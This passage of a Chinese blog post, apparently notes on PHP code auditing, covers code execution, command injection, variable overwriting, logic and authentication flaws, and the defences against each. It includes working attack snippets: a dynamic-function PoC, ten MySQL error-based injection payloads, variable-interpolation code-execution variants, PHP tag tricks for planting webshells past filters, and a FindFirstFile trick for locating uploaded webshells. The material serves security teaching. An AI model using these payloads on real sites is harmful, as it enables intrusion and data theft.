class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()、call_user_func_array()、array_map()、</span><br><span class="line">usort()、uasort()、uksort()、array_filter()、</span><br><span class="line">array_reduce()、array_diff_uassoc()、array_diff_ukey()、</span><br><span class="line">array_udiff()、array_udiff_assoc()、array_udiff_uassoc()、</span><br><span class="line">array_intersect_assoc()、array_intersect_uassoc、</span><br><span class="line">array_uintersect()、array_uintersect_assoc()、</span><br><span class="line">array_uintersect_uassoc()、array_walk()、array_walk_recursive()、</span><br><span class="line">xml_set_character_data_handler()、xml_set_default_handler()、</span><br><span class="line">xml_set_element_handler()、xml_set_end_namespace_decl_handler()、</span><br><span class="line">xml_set_external_entity_ref_handler()、xml_set_notation_decl_handler()、</span><br><span class="line">xml_set_processing_instruction_handler()、</span><br><span class="line">xml_set_start_namespace_decl_handler()、</span><br><span class="line">xml_set_unparsed_entity_decl_handler()、stream_filter_register()、</span><br><span class="line">set_error_handler()、register_shutdown_function()、register_tick_function()</span><br></pre></td></tr></table></figure></li></ol><h5 id="动态函数执行"><a href="#动态函数执行" class="headerlink" title="动态函数执行"></a>动态函数执行</h5><p>由于PHP的特性，PHP函数可以直接由字符串拼接，加大了安全控制的难度。PHP动态函数写法为<code>变量（参数）</code>，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_GET[&#39;a&#39;]($_GET[&#39;b&#39;]);# poc:?a&#x3D;assert&amp;b&#x3D;phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>想要挖掘这种形式的代码执行漏洞，需要找可控的动态函数名。</p><h5 id="漏洞防范-3"><a href="#漏洞防范-3" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><p>采用参数白名单过滤，这里的白名单并不是说完全固定为参数，可以结合正则表达式来进行白名单限制。</p><h4 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h4><p>代码执行漏洞指的是可以执行PHP脚本代码，而命令执行漏洞指的是可以执行系统或应用指令（如CMD命令或bash命令）的漏洞。PHP的命令执行漏洞主要基于一些函数的参数过滤不严导致，可以执行命令的函数有system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()这七个函数，另外反引号也可以执行命令，不过实际上这种方式也是调用的shell_exec()函数。PHP命令执行继承了WebServer用户权限，一般该权限都可以向Web目录写文件。</p><h5 id="挖掘经验-8"><a href="#挖掘经验-8" class="headerlink" title="挖掘经验"></a>挖掘经验</h5><p>该漏洞多出现在包含环境包的应用里，一般这类产品会有额外的脚本来协助处理日志及数据库等，web应用会有比较多的点之间使用system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()等函数执行系统命令来调用这些脚本，可以直接在代码中搜索这几个函数，收获应该会不少。除了这类应用，还有一些调用外部程序的功能也会出命令执行漏洞，由于特征明显，可以直接搜索函数名进行挖掘。</p><h6 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h6><p>上述的函数中，sustem()、exec()、shell_exec()、passthru()以及反引号是可以直接传入命令并返回执行结果。<br>popen()、proc_open()函数不会直接返回执行结果，而是返回一个文件指针。</p><h6 id="反引号命令执行"><a href="#反引号命令执行" class="headerlink" title="反引号命令执行"></a>反引号命令执行</h6><p>反引号执行命令是调用的shell_exec()函数。</p><h5 id="漏洞防范-4"><a href="#漏洞防范-4" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><ol><li>使用PHP自带的命令防注入函数，包括escapeshellcmd()（过滤整条命令）和escapeshellarg()（保证传入命令执行函数的参数确实是以字符串参数形式存在，不能被注入）。</li><li>对命令执行函数的参数做白名单限制。（通用修复方法）</li></ol><h3 id="漏洞挖掘与防范（深入篇）"><a href="#漏洞挖掘与防范（深入篇）" class="headerlink" title="漏洞挖掘与防范（深入篇）"></a>漏洞挖掘与防范（深入篇）</h3><h4 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h4><p>变量覆盖指的是可以用我们自定义的参数值替换程序原有的变量值，通常需要结合程序的其它功能来实现完整攻击。<br>该类漏洞大多由函数使用不当导致，常引发漏洞的函数有：extract()函数和parse_str()，import_request_variables()函数则是用于未开启全局变量注册时，调用该函数相当于开启了全局变量注册，在PHP5.4后该函数已经被取消。另外部分应用利用$$的方式注册变量没验证已有变量导致覆盖，这些应用在使用外部传递进来的参数时不是用类似于<code>$_GET[&#39;key&#39;]</code>这样原始的数组变量，而是把里面的key注册成一个变量$key，注册过程中没有验证该变量是否已经存在，所以会导致变量覆盖。</p><h5 id="挖掘经验-9"><a href="#挖掘经验-9" class="headerlink" title="挖掘经验"></a>挖掘经验</h5><p>由于变量覆盖漏洞通常要结合其他功能代码来实现完整攻击，所以挖掘可用的变量覆盖漏洞还要考虑究竟哪些变量可以被覆盖并且后面有被使用。<br>由函数导致的变量覆盖比较好挖掘，寻找参数带有变量的extract()、parse_str()函数，回溯变量是否可控。import_request_variables()则只需要找没有初始化且操作前没有赋值的变量，就可以大胆的提交该变量作为参数，另外只要写在该函数前的变量，不管是否已经初始化都可以覆盖，不过该函数只在PHP4-4.1.0以及5-5.4.0可用。<br>关于国内很多程序使用<code>$$</code>符号注册变量会导致变量覆盖，可以直接搜索<code>$$</code>去挖掘，不过建议挖掘前应通读核心文件。</p><h6 id="函数使用不当"><a href="#函数使用不当" class="headerlink" title="函数使用不当"></a>函数使用不当</h6><ol><li>extract()（最常见）：将数组中的键值对注册成变量，函数结构如下： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int extract (array &amp;$var_array [, int $extract_type &#x3D; EXTR_OVERWRITE [, string $prefix &#x3D; NULL]])</span><br></pre></td></tr></table></figure> 该函数有3种可能会覆盖已有变量，第一种是第二个参数为EXTR_OVERWRITE，它表示如果有冲突，则覆盖已有变量；第二种是只传入第一个参数，默认为EXTR_OVERWRITE模式；第三种则是第二个参数为EXTR_IF_EXISTS，表示仅在当前符号表中已有同名变量时，覆盖它们的值，其它的都不注册新变量。</li><li>parse_str()：解析字符串并注册成变量，在注册变量前不会验证当前变量是否已经存在，所以会直接覆盖掉已有变量。该函数有两个参数： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void parse_str(string $str [, array &amp;$arr])</span><br></pre></td></tr></table></figure> 其中<code>$str</code>是必须的，代表要解析注册成变量的字符串，形式为<code>a=1</code>，经过函数后会注册变量$a并赋值1。第二个参数$arr是一个数组，当第二个参数存在时，注册的变量会放在这个数组内，但如果该数组内原先就存在相同的键（key），则会覆盖原有键值。</li><li>import_request_variables()：作用是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候，需要PHP4.1-5.4之间的版本。不过建议不开globals的时候也不要使用该函数，容易造成变量覆盖。</li></ol><h6 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="$$变量覆盖"></a>$$变量覆盖</h6><p>由于双$导致原变量被覆盖，在漏洞代码之前的变量都可以被覆盖。</p><h5 id="漏洞防范-5"><a href="#漏洞防范-5" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><p>最常见漏洞点是做变量注册以及赋值给变量的时候没有验证变量是否存在，所以推荐使用原始的变量数组，如<code>$_GET</code>、<code>$_POST</code>，或者在注册变量前一定要验证变量是否存在。</p><h6 id="使用原始变量"><a href="#使用原始变量" class="headerlink" title="使用原始变量"></a>使用原始变量</h6><p>由于上述变量覆盖漏洞是在进行变量注册时导致，所以要解决变量覆盖的问题，最直接的方法就是不进行变量注册，直接使用原生的<code>$_GET</code>、<code>$_POST</code>等数组变量进行操作，如果考虑到程序可读性等原因，需要注册个别变量，可以直接在代码中定义变量，然后再把请求中的值赋值给它。</p><h6 id="验证变量存在"><a href="#验证变量存在" class="headerlink" title="验证变量存在"></a>验证变量存在</h6><p>如果一定要用前面几种方式注册变量，可以在注册变量前先判断变量是否存在，如使用extract()函数则可以配置第二个参数为EXTR_SKIP。使用parse_str()函数注册变量钱需要自行通过代码判断变量是否存在。不建议使用import_request_variables()注册全局变量，会导致变量不可控。最重要的，自行申明的变量一定要初始化，不然即便注册在执行代码前也能被覆盖。</p><h4 id="逻辑处理漏洞"><a href="#逻辑处理漏洞" class="headerlink" title="逻辑处理漏洞"></a>逻辑处理漏洞</h4><p>此次指程序在业务逻辑上的漏洞。</p><h5 id="挖掘经验-10"><a href="#挖掘经验-10" class="headerlink" title="挖掘经验"></a>挖掘经验</h5><p>漏洞大多存在于逻辑处理及业务流程中，没有特别明显的关键字用于快速定位，挖掘技巧通常是通读功能点源码，熟悉业务流程，可关注程序是否可重复安装、修改密码处是否可越权修改其它用户密码、找回密码验证码是否可暴力破解以及修改其它用户密码、cookie是否可预测或cookie验证是否可绕过等。</p><h6 id="等于与存在判断绕过"><a href="#等于与存在判断绕过" class="headerlink" title="等于与存在判断绕过"></a>等于与存在判断绕过</h6><p>判断函数存在漏洞时，可以逃逸判断函数绕过逻辑。常见存在漏洞的判断函数有：</p><ol><li>in_array()：用于判断一个值是否在某个数组列表里，该函数存在一个问题，比较前会自动做类型转换，实现输入参数并不全等于数组任意值时，也可以实现绕过并注入。</li><li>is_numeric()：用于判断一个变量是否为数字，检查通过返回true，否则返回false。该函数存在一个问题，当传入参数为hex时则直接通过并返回true，而mysql是可以直接使用hex编码代替字符串名为的。所以这里虽然不能直接注入SQL语句，但存在二次注入和XSS等漏洞隐患，比如当我们提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的hex编码时，效果相同。如果程序有其它地方调用该值并直接输出，则有可能执行代码触发XSS漏洞。</li><li>双等于和三等于：双等于在判断等于前会先做变量类型转换，三等于则不会，所以双等于存在安全风险。</li></ol><h6 id="账户体系中的越权漏洞"><a href="#账户体系中的越权漏洞" class="headerlink" title="账户体系中的越权漏洞"></a>账户体系中的越权漏洞</h6><p>漏洞分为水平越权和垂直越权，但漏洞原理相同，都是账户体系在判断权限时不严格导致存在绕过漏洞。这一类绕过通常发生在cookie验证不严、简单判断用户提交的参数，归根结底，都是因为参数在客户端提交，服务端未严格校验。</p><h6 id="未exit或return引发的安全问题"><a href="#未exit或return引发的安全问题" class="headerlink" title="未exit或return引发的安全问题"></a>未exit或return引发的安全问题</h6><p>某些情况下，在经过if条件判断之后，要么继续执行if后面的代码，要么在if流程内退出当前操作，但该退出行为，有不少程序忘记写return、die()、或者exit()，导致程序继续执行。</p><h6 id="常见支付漏洞"><a href="#常见支付漏洞" class="headerlink" title="常见支付漏洞"></a>常见支付漏洞</h6><p>最常见支付漏洞有四种，第1、2、3种比较简单，分别是客户端可修改单价、总价和购买数量，服务器端未严格校验导致。部分商城程序是直接由单价和数量计算总价，但并没有验证这两个数字是否小于0。这种形式的支付漏洞，可以通过寻找支付代码并看代码过滤情况挖掘。<br>还有一种是以重复发包来利用时间差，少量钱多次购买，如使用手机给腾讯发送购买QQ业务的短信再快速取消。这类漏洞可从判断余额及扣费功能代码处寻找。</p><h5 id="漏洞防范-6"><a href="#漏洞防范-6" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><ol><li>深入熟悉业务逻辑。</li><li>多熟悉函数的功能和差异。</li></ol><h4 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a>会话认证漏洞</h4><h5 id="挖掘经验-11"><a href="#挖掘经验-11" class="headerlink" title="挖掘经验"></a>挖掘经验</h5><p>在cookie验证上出现几率较高，通常是没有使用session认证，而是将用户信息直接保存在cookie中，以备程序使用时直接调用。一般这个过程都会有一个统一的函数去调用数据，容易导致SQL注入和越权等漏洞。在挖掘登录认证漏洞时，可以先看程序的登录功能代码，看整个登录过程的业务逻辑有没有可以控制session值或直接绕过密码验证的漏洞；另外需要关注程序验证是否为登录的代码，通俗的说是验证cookie的代码，是不是直接取cookie的值，然后如何判断这个值来验证是否登录。</p><h6 id="cookie认证安全"><a href="#cookie认证安全" class="headerlink" title="cookie认证安全"></a>cookie认证安全</h6><p>cookie可以保存任何字符串，各个浏览器保存cookie字节数大小不一样，一般不超过4096个字节，通常用于保存登录帐号的标识信息。cookie出现问题较多的是cookie的SQL注入等常见漏洞，以及web应用程序在服务端直接读取cookie值来操作当前用户数据，由于cookie可以伪造，从而导致伪造用户身份登录的漏洞。</p><h5 id="漏洞防范-7"><a href="#漏洞防范-7" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><p>了解认证的业务逻辑，严格限制输入的异常字符以及避免直接使用客户端提交的内容进行操作。应该结合cookie和session，不能直接从cookie获取参数值进行操作，另外注意设置session时，需要保证客户端不能操作敏感session参数。特别注意敏感数据不要放在cookie中，cookie在浏览器端以及传输过程中都有被窃取的可能性。</p><h3 id="二次漏洞审计"><a href="#二次漏洞审计" class="headerlink" title="二次漏洞审计"></a>二次漏洞审计</h3><h4 id="什么是二次漏洞"><a href="#什么是二次漏洞" class="headerlink" title="什么是二次漏洞"></a>什么是二次漏洞</h4><p>需要先构造好利用代码写入网站保存，在第二次或多次请求后调用攻击代码触发或修改配置触发的漏洞叫做二次漏洞。该漏洞的出现归根结底是开发者在可信数据的逻辑上考虑不全面。</p><h4 id="二次漏洞审计技巧"><a href="#二次漏洞审计技巧" class="headerlink" title="二次漏洞审计技巧"></a>二次漏洞审计技巧</h4><p>虽然二次漏洞写入和触发payload很可能不在同一个地方，但还是可以通过找相关关键字去定位的，只是精准度会稍微降低。大多数二次漏洞的逻辑性比一般的漏洞强的多，所以最好还是把全部代码读一遍，更好的了解业务逻辑和全局配置。<br>业务逻辑越复杂的地方越容易出现二次漏洞，我们可以重点关注购物车、订单、引用数据、文章编辑、草稿等和数据库交互的地方，以及和文件系统交互的系统配置文件（一般需要管理员权限才能操作）。<br>在二次漏洞类型里，可以重点关注SQL注入、XSS。</p><h3 id="代码审计小技巧"><a href="#代码审计小技巧" class="headerlink" title="代码审计小技巧"></a>代码审计小技巧</h3><h4 id="钻GPC等转义的空子"><a href="#钻GPC等转义的空子" class="headerlink" title="钻GPC等转义的空子"></a>钻GPC等转义的空子</h4><p>GPC会自动把提交内容的敏感字符转义导致攻击代码无法执行，但还是存在漏洞：</p><h5 id="SERVER变量"><a href="#SERVER变量" class="headerlink" title="$_SERVER变量"></a>$_SERVER变量</h5><p>在PHP5后，用<code>$_SERVER</code>取到的<code>header</code>字段不受GPC影响，且普通程序员很少会考虑到这些字段。<code>header</code>注入里常见的是<code>user-agent</code>、<code>referer</code>以及<code>client-ip/x-forward-for</code>，因为大多数Web应用都会记录访问者的IP以及<code>referer</code>等信息，同样的<code>$_FILES</code>变量也不受GPC保护。</p><h5 id="编码转换问题"><a href="#编码转换问题" class="headerlink" title="编码转换问题"></a>编码转换问题</h5><p>宽字节注入就是一种非常典型的编码转换问题导致绕过GPC的方式。不仅是PHP与MySQL交互过程中会发生编码转换导致问题，PHP自带的编码转换函数也会发生问题，比如mb_convert_encoding()、iconv()，也就是只要发生编码转换就有可能会出现问题。</p><h4 id="神奇的字符串"><a href="#神奇的字符串" class="headerlink" title="神奇的字符串"></a>神奇的字符串</h4><h5 id="字符处理函数报错信息泄漏"><a href="#字符处理函数报错信息泄漏" class="headerlink" title="字符处理函数报错信息泄漏"></a>字符处理函数报错信息泄漏</h5><p>页面的报错信息通常能泄漏文件绝对路径、代码、变量及函数等信息，页面报错有很多情况，但不是所有情况页面都会出现错误信息，显示错误信息需要在PHP配置文件中打开并设置等级。<br>大多数错误提示会显示文件路径，可以获取Web路径。由于用户提交数据在后端大多是以字符串方式处理，所以利用字符串处理函数报错成了必不可少的方法，对于利用参数来报错的方式，给函数传入不同类型的变量是最实用的方式。</p><h5 id="字符串截断"><a href="#字符串截断" class="headerlink" title="字符串截断"></a>字符串截断</h5><p>截断利用最多的是在文件操作上面，通常用来利用文件包含漏洞和文件上传漏洞，<code>%00</code>即NULL会被GPC和addslashes()过滤掉，所以利用<code>%00</code>截断需要GPC关闭以及不被addslashes()函数过滤，另外PHP5.3之后也不能用这种方式截断。</p><ol><li>iconv字符编码转换截断：如从UTF-8转换到GBK，部分代码不能被成功转换（chr(128)-chr(255)之间），在利用该函数转码时，遇到不能处理的字符串时后续字符串不会被处理。</li></ol><h4 id="php-输入输出流"><a href="#php-输入输出流" class="headerlink" title="php://输入输出流"></a>php://输入输出流</h4><h4 id="PHP代码解析标签"><a href="#PHP代码解析标签" class="headerlink" title="PHP代码解析标签"></a>PHP代码解析标签</h4><ol><li>最标准的<code>&lt;?php?&gt;</code></li><li>脚本标签：<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>，可以正常解析PHP代码</li><li>短标签：<code>&lt;?...?&gt;</code>，使用短标签需要在php.ini中设置short_open_tag=on，默认为on状态。</li><li>asp标签<code>&lt;%...%&gt;</code>，在PHP3.0.4后可用，需要在php.ini中设置asp_tags=on，默认为off。<br>通常用于绕过<code>&lt;?php?&gt;</code>标签过滤以留后门及绕过Web程序或waf写入webshell。</li></ol><h4 id="fuzz漏洞发现"><a href="#fuzz漏洞发现" class="headerlink" title="fuzz漏洞发现"></a>fuzz漏洞发现</h4><h4 id="不严谨的正则表达式"><a href="#不严谨的正则表达式" class="headerlink" title="不严谨的正则表达式"></a>不严谨的正则表达式</h4><ol><li>没有用<code>^</code>和<code>$</code>限定匹配开始位置</li><li>特殊字符未转义，匹配特殊字符的原字符时需要使用反斜杠<code>\</code>来进行转义，不然<code>.</code>则可以用来表示任何字符，存在安全隐患。</li></ol><h4 id="十余种MySQL报错注入"><a href="#十余种MySQL报错注入" class="headerlink" title="十余种MySQL报错注入"></a>十余种MySQL报错注入</h4><p>利用报错注入最快拿到注入的数据。</p><ol><li>floor():<code>id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></li><li>extractvalue():<code>id=1 and (extractvalue(1, concat(0x5c, (select user()))))</code></li><li>updatexml():<code>id=1 AND (updatexml(1,concat(0x5e24,(select user()),0x5e24),1))</code></li><li>GeometryCollection():<code>id=1 AND GeometryCollection((select * from(select * from(select user())a)b))</code></li><li>polygon():<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li><li>multipoint():<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li><li>multilinestring():<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li><li>multipolygon():<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li><li>linestring():<code>id=1 AND linestring((select * from(select * from(select user())a)b))</code></li><li>exp():<code>id=1 and EXP(~(select * from(select user())a))</code></li></ol><h4 id="Windows-FindFirstFile"><a href="#Windows-FindFirstFile" class="headerlink" title="Windows FindFirstFile"></a>Windows FindFirstFile</h4><p>目前大多数程序会对上传文件名加密，这样我们就无法直接得到上传webshell文件路径，但在windows下时，我们只需要知道文件所在目录，利用win特性就可以访问文件，因为win在搜索文件时使用了FindFirstFile这一个winapi函数去一个文件夹（包括子文件夹）去搜索指定文件。<br>利用方法很简单，只需要将文件名不可知部分之后的字符用<code>&lt;</code>或<code>&gt;</code>代替即可，不过要注意，只使用一个<code>&lt;</code>或<code>&gt;</code>则只能代表一个字符，如果文件名是12345或更长，请求<code>1&lt;</code>或<code>1&gt;</code>都访问不到文件，需要<code>1&lt;&lt;</code>才能访问到，代表继续往下搜索，有点像win的短文件名。<br>目前所有PHP版本都可用，PHP并没有在语言层面禁止使用<code>&lt;&gt;</code>这些特殊字符，从函数层面来讲，可以利用这个特性的函数有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">include() include_once() require() require_once()</span><br><span class="line">fopen() ziparchive::open()</span><br><span class="line">copy()</span><br><span class="line">file_get_contents() parse_ini_file() readfile()</span><br><span class="line">file_put_contents()</span><br><span class="line">mkdir()</span><br><span class="line">tempnam() touch()</span><br><span class="line">move_uploaded_file()</span><br><span class="line">opendir() readdir() rewinddir() closedir()</span><br></pre></td></tr></table></figure><h4 id="PHP可变变量"><a href="#PHP可变变量" class="headerlink" title="PHP可变变量"></a>PHP可变变量</h4><p>部分PHP应用在写配置文件或使用preg_replace()函数第二个参数赋值变量时，会用到双引号来代表string类型给变量赋值，存在代码执行漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;&quot;$&#123;@phpinfo()&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注意，上述代码中的<code>@</code>是必须存在的，不然代码无法执行，但除了该符号外还有其它写法，只要不影响PHP规范就可以执行，举例：</p><ol><li>花括号内第一个字符为空格：<code>$a = &quot;$&#123; phpinfo()&#125;&quot;;</code></li><li>花括号内第一个字符为TAB：<code>$a = &quot;$&#123;  phpinfo()&#125;&quot;;</code></li><li>花括号内第一个字符为注释符：<code>$a = &quot;$&#123;/**/phpinfo()&#125;&quot;;</code></li><li>花括号内第一个字符为回车换行符：<code>$a = &quot;$&#123; phpinfo()&#125;&quot;;</code></li><li>花括号内第一个字符为加号：<code>$a = &quot;$&#123;+phpinfo()&#125;&quot;;</code></li><li>花括号内第一个字符为减号：<code>$a = &quot;$&#123;-phpinfo()&#125;&quot;;</code></li><li>花括号内第一个字符为感叹号：<code>$a = &quot;$&#123;!phpinfo()&#125;&quot;;</code><br>除此之外还有一些如<code>~</code>、<code>\</code>等。</li></ol><h2 id="PHP安全编程规范"><a href="#PHP安全编程规范" class="headerlink" title="PHP安全编程规范"></a>PHP安全编程规范</h2><h3 id="参数的安全过滤"><a href="#参数的安全过滤" class="headerlink" title="参数的安全过滤"></a>参数的安全过滤</h3><h4 id="第三方过滤函数与类"><a href="#第三方过滤函数与类" class="headerlink" title="第三方过滤函数与类"></a>第三方过滤函数与类</h4><p>目前大多数程序都有一个统一的参数过滤入口，但对于特定场景和漏洞就不够好用。所以除了总入口，在具体功能点也需要进行过滤。</p><h4 id="内置过滤函数"><a href="#内置过滤函数" class="headerlink" title="内置过滤函数"></a>内置过滤函数</h4><ol><li>SQL注入过滤函数：有addslashes()、mysql_real_escape_string()以及mysql_escape_string()，作用都是给字符串添加反斜杠<code>\</code>来转义掉单引号、双引号、反斜杠以及空字符NULL。addslashes()和mysql_escape_string()都是直接在敏感字符串前加反斜杠，可能会存在宽字节注入绕过的问题，而mysql_real_escape_string()会考虑当前连接数据库的字符集编码，更加安全。</li><li>XSS过滤函数：有htmlspecialchars()和strip_tags()，功能不同，htmlspecialchars作用是将字符串中的特殊字符转换成HTML实体编码，能够干掉大多数的XSS攻击。strip_tags则是用来去掉HTML及PHP标记。</li><li>命令执行过滤函数：有escapeshellcmd()和escapeshellarg()两个函数，escapeshellcmd过滤的字符为下方代码框所示，win下过滤方式则是在这些字符前面加了<code>^</code>符号，linux下则是在这些字符前加了反斜杠。escapeshellarg函数过滤较简单，给所有参数加上一对双引号，强制为字符串。 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;,;,&#96;,|,*,?,~,&lt;,&gt;,^,(,),[,],&#123;,&#125;,$,\,\x0A,\xFF,% 以及单双引号</span><br></pre></td></tr></table></figure></li></ol><h3 id="使用安全的加密算法"><a href="#使用安全的加密算法" class="headerlink" title="使用安全的加密算法"></a>使用安全的加密算法</h3><ol><li>对称加密：算法安全性比较高，数据的实际安全性取决于密钥的管理。所以不建议使用对称加密对用户密码进行加密存储。</li><li>非对称加密：安全性比对称加密更好。</li><li>单向加密：不可逆算法，常见如MD系列和sha1，通常用于保存密码和做数字签名，但存在碰撞的问题。</li></ol><h3 id="业务功能安全设计"><a href="#业务功能安全设计" class="headerlink" title="业务功能安全设计"></a>业务功能安全设计</h3><h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><h5 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h5><ol><li>不刷新直接绕过：后端接收一次请求后并没有主动刷新验证码，将验证码和session绑定在一起，为了保证验证码正常使用，会把验证码明文或加密后放在Cookie或POST数据包里，所以每次只要同一个数据包里的两个验证码对应即可绕过。（重复发包利用？）</li><li>暴力破解：验证码能够被爆破，主要是程序没有设置验证码错误次数和超时设定，导致能够不断尝试。</li><li>机器识别：利用机器识别验证码。</li><li>打码平台：人工打码绕过。</li></ol><h6 id="对策"><a href="#对策" class="headerlink" title="对策"></a>对策</h6><ol><li>设置验证码错误次数（最重要）。</li><li>不把验证码放在HTML页面或cookie中。</li><li>验证码设置只能请求一次，请求一次后不管错误与否都在后端程序强制刷新。</li><li>短信或邮件验证码必须要6位以上字母和数字混合，图片或语音验证码需要加强混淆干扰。（短信验证码这条似乎在当前不适用，多数厂商选择限制短时间同IP发包等，但不增加验证码复杂度）</li><li>验证码要动态生成，不能统一生成多次调用。</li></ol><h5 id="验证码资源滥用"><a href="#验证码资源滥用" class="headerlink" title="验证码资源滥用"></a>验证码资源滥用</h5><p>利用大量网站短信验证码未限制获取验证码次数和时间间隔的接口，实现短信/邮箱轰炸。防护比较简单，限制单个手机号在一个时间段内请求接收短信的次数，或限制某一IP在一个时间段内请求接收短信的次数。</p><h4 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h4><h5 id="撞库登录"><a href="#撞库登录" class="headerlink" title="撞库登录"></a>撞库登录</h5><p>指登录口没有做登录次数限制，导致可以使用不同的用户及密码不断进行登录尝试，遍历用户密码。撞库漏洞情况有：</p><ol><li>用户名和密码错误次数都无限制。</li><li>单时间段内用户密码错误次数限制。（可以使用单密码和用户名列表撞库）</li><li>单时间段内IP登录错误次数限制。（存在误杀内网用户的可能）<br>比较好的解决方案是使用登录验证码和多因素认证。</li></ol><h5 id="API登录"><a href="#API登录" class="headerlink" title="API登录"></a>API登录</h5><p>免重新登录跳转处存在漏洞，如修改用户参数实现任意登录。对于这种漏洞注意以下安全点：</p><ol><li>登录密钥（clientkey）需要不可预测且不固定，生成key的算法中加入随机字符。</li><li>API接口禁止搜索引擎收录。</li><li>登录密钥当次绑定当前主机，换机器不可用，防止木马和嗅探。</li></ol><h4 id="用户注册"><a href="#用户注册" class="headerlink" title="用户注册"></a>用户注册</h4><ol><li>设计验证码。</li><li>采集用户机器唯一识别码，拦截短时间内多次注册。</li><li>根据帐号格式自学习识别垃圾帐号。</li><li>防止SQL注入漏洞与XSS漏洞（常见）。</li></ol><h4 id="密码找回"><a href="#密码找回" class="headerlink" title="密码找回"></a>密码找回</h4><ol><li>输入用户名/邮箱/手机阶段：抓包修改手机/邮箱参数。</li><li>填写验证码和新密码阶段：<ul><li>验证凭证简单，可以被暴力破解。</li><li>验证凭证算法简单，凭证可以被预测。</li><li>验证凭证直接保存在源码里。</li></ul></li><li>发送新密码阶段：<br>凭证未绑定用户：请求发送至邮箱的找回密码链接时，后端根据uid和key对应判断该链接有效，但将新密码提交到服务器时，服务器端没有判断当前key是否和uid或邮箱匹配，直接修改掉uid或邮箱指定的用户密码。这样只要拦截修改密码的请求包，篡改用户参数即可。所以安全风险点应该注意的有：<ul><li>接收验证码的邮箱和手机号不可由用户控制，应直接从数据库读取。</li><li>加强验证凭证复杂度，防止被暴力破解。</li><li>限制验证凭证错误次数，单用户在一定时间内验证码错误一定次数，强制等待一段时间。</li><li>验证凭证设置失效时间。</li><li>验证凭证不要保存在页面。</li><li>输入用户邮箱或ID、手机号取验证凭证的地方需要设置验证码防止短信炸弹和批量找回等。</li><li>验证凭证跟用户名、用户ID、用户邮箱绑定，找回密码时验证当前凭证是否是当前用户的。</li></ul></li></ol><h4 id="资料查看和修改"><a href="#资料查看和修改" class="headerlink" title="资料查看和修改"></a>资料查看和修改</h4><p>这里主要介绍的是越权漏洞的利用。</p><ol><li>未验证用户权限：直接修改当前资源ID即可访问该资源，没有验证当前资源是否属于当前用户。</li><li>未验证当前登录用户：虽然程序绑定了用户ID和资源ID，但该用户ID是访问资源时直接从cookie或post、get参数里获取，所以可以通过修改成另一用户ID，利用其权限操作资源。<br>上述漏洞较多出现在用户资料修改，及用户资料查看。<br>防御思路有：</li></ol><ul><li>用户资源ID（订单ID、地址ID等）绑定到用户，只允许有权限的用户查看。</li><li>当前用户信息存储到session，不放在request中，避免攻击者修改。</li></ul><h4 id="投票-积分-抽奖"><a href="#投票-积分-抽奖" class="headerlink" title="投票/积分/抽奖"></a>投票/积分/抽奖</h4><p>共同点：<code>单个用户次数存在限制</code>，该限制存在很多绕过方式。<br>通常有几种利用方法：</p><ol><li>cookie或POST请求正文绕过。修改cookie或post请求数据产生绕过。</li><li>基于IP验证。看程序获取IP的方式，如果是client-ip或x_forward_for获取IP，可直接伪造IP绕过。</li><li>基于用户认证。利用批量注册刷票，或在投票时随意修改POST包或cookie里的当前uid、用户名等查看是否能够绕过限制。<br>从上述利用手段可以看到主要三个点是IP、登录用户、cookie，可用性比较高的防御手段如下：</li><li>机器识别码验证。</li><li>操作需要登录，当前用户信息从session读取。</li></ol><h4 id="充值支付"><a href="#充值支付" class="headerlink" 